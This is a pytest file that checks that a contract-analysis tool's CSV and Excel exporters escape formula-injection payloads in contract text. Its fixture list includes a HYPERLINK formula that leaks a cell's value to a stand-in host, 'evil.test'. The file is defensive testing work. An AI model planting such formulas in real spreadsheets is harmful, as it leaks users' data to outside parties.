"""CSV and Excel export: text from a contract must never become a live formula."""

from __future__ import annotations

import csv
from decimal import Decimal

import openpyxl
import pytest

from contractex.core.models import Clause, Contract, FinancialTerm, Party, RiskFlag
from contractex.utils.exporters import CSVExporter, ExcelExporter

FORMULAS = [
    '=HYPERLINK("http://evil.test/?x="&A1,"Click")',
    "+1+1",
    "-2+3",
    "@SUM(1+1)",
]


def hostile_contract(payload: str) -> Contract:
    return Contract(
        contract_type="nda",
        title=payload,
        parties=[Party(name=payload)],
        clauses=[Clause(clause_type=payload, text=payload, section_number=payload)],
        financial_terms=[
            FinancialTerm(
                term_type=payload,
                amount=Decimal("-500"),
                currency="USD",
                frequency=payload,
                description=payload,
            )
        ],
        risks=[
            RiskFlag(
                risk_type=payload, severity="high", description=payload, recommendation=payload
            )
        ],
    )


def workbook_cells(path) -> list[tuple[str, str, object]]:
    return [
        (ws.title, cell.coordinate, cell.value)
        for ws in openpyxl.load_workbook(path)
        for row in ws.iter_rows()
        for cell in row
    ]


@pytest.mark.parametrize("payload", FORMULAS)
class TestFormulaInjection:
    def test_dataframe_text_is_escaped(self, payload):
        row = hostile_contract(payload).to_dataframe().iloc[0]
        assert row["text"] == "'" + payload
        assert row["clause_type"] == "'" + payload
        assert row["section_number"] == "'" + payload

    def test_excel_has_no_cell_starting_with_a_formula_character(self, payload, tmp_path):
        path = tmp_path / "c.xlsx"
        ExcelExporter.export(hostile_contract(payload), path)
        cells = workbook_cells(path)
        assert any(value == "'" + payload for _, _, value in cells)
        bad = [c for c in cells if isinstance(c[2], str) and c[2].startswith(("=", "+", "@"))]
        assert bad == []
        # the amount is a number written as text, not an escaped formula
        assert ("Financial Terms", "B2", "-500") in cells

    def test_batch_summary_is_escaped(self, payload, tmp_path):
        path = tmp_path / "b.xlsx"
        ExcelExporter.export_batch([hostile_contract(payload)], path)
        bad = [
            c
            for c in workbook_cells(path)
            if isinstance(c[2], str) and c[2].startswith(("=", "+", "-", "@"))
        ]
        assert bad == []

    def test_csv_exports_are_escaped(self, payload, tmp_path):
        clauses, terms = tmp_path / "clauses.csv", tmp_path / "terms.csv"
        contract = hostile_contract(payload)
        CSVExporter.export_clauses(contract, clauses)
        CSVExporter.export_financial_terms(contract, terms)
        for path in (clauses, terms):
            with open(path, newline="", encoding="utf-8") as f:
                cells = [cell for row in csv.reader(f) for cell in row]
            assert "'" + payload in cells
            assert [c for c in cells if c.startswith(("=", "+", "@"))] == []


class TestOrdinaryText:
    def test_plain_text_is_unchanged(self):
        contract = Contract(clauses=[Clause(clause_type="payment", text="Net 30 - no discount.")])
        assert contract.to_dataframe().iloc[0]["text"] == "Net 30 - no discount."

    def test_contract_type_is_written_as_its_value(self, tmp_path):
        contract = Contract(contract_type="nda", clauses=[Clause(clause_type="term", text="x")])
        assert contract.to_dataframe().iloc[0]["contract_type"] == "nda"
        path = tmp_path / "c.xlsx"
        ExcelExporter.export(contract, path)
        assert ("Overview", "B2", "nda") in workbook_cells(path)
        ExcelExporter.export_batch([contract], path)
        assert ("Summary", "B2", "nda") in workbook_cells(path)


class TestFinancialTermsCsv:
    HEADER = "term_type,amount,currency,frequency,due_date,description,confidence"

    def test_no_terms_writes_header_only_file(self, tmp_path):
        path = tmp_path / "terms.csv"
        path.write_text("term_type,amount\nfee,999\n")  # a previous contract's export
        CSVExporter.export_financial_terms(Contract(), path)
        assert path.read_text().splitlines() == [self.HEADER]

    def test_zero_amount_is_exported(self, tmp_path):
        contract = Contract(
            financial_terms=[
                FinancialTerm(term_type="setup_fee", amount=Decimal("0"), description="waived")
            ]
        )
        path = tmp_path / "terms.csv"
        CSVExporter.export_financial_terms(contract, path)
        with open(path, newline="", encoding="utf-8") as f:
            assert list(csv.DictReader(f))[0]["amount"] == "0"
        xlsx = tmp_path / "c.xlsx"
        ExcelExporter.export(contract, xlsx)
        assert ("Financial Terms", "B2", "0") in workbook_cells(xlsx)


def test_batch_export_writes_a_sheet_for_every_contract(tmp_path):
    contracts = [Contract(clauses=[Clause(clause_type="term", text=f"t{i}")]) for i in range(12)]
    path = tmp_path / "b.xlsx"
    ExcelExporter.export_batch(contracts, path)
    assert openpyxl.load_workbook(path).sheetnames == ["Summary"] + [
        f"Contract {i}" for i in range(1, 13)
    ]
